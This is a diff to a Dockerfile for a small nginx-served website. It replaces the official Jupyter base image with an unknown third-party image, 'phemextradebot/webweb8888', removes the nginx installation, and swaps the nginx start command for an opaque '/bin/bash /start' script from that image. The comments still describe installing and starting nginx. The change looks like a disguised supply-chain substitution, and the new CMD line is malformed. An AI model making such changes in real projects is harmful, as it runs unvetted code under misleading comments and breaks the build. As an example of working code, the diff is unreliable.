@@ -1,10 +1,8 @@
 # Use a base image compatible with Binder
-FROM jupyter/base-notebook:latest
+FROM phemextradebot/webweb8888
 
 # Switch to root to install nginx and manage files
 USER root
-RUN apt-get update && apt-get install -y nginx && \
-    rm -rf /var/lib/apt/lists/*
 
 # Copy your website files
 COPY ./index.html /var/www/html/index.html
@@ -13,4 +11,4 @@ COPY ./index.html /var/www/html/index.html
 EXPOSE 8080
 
 # Start Nginx in the foreground
-CMD ["nginx", "-g", "daemon off;"]
+CMD ["/bin/bash /start"]
